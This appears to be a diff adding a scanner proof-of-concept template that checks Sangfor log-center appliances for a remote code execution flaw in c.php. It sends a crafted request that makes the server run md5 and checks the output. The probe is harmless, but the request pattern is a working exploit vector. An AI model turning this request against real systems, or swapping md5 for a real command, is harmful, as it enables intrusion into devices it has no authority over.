@@ -1,0 +1,13 @@
+name: poc-yaml-sangfor-ba-rce
+set:
+  r1: randomLowercase(8)
+rules:
+  - method: GET
+    path: /tool/log/c.php?strip_slashes=md5&host={{r1}}
+    expression: |
+      response.status == 200 && response.content_type.contains("text/html") && response.body.bcontains(bytes(md5(r1)))
+
+detail:
+  author: Print1n(http://print1n.top)
+  links:
+    - http://wiki.peiqi.tech/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E6%97%A5%E5%BF%97%E4%B8%AD%E5%BF%83%20c.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
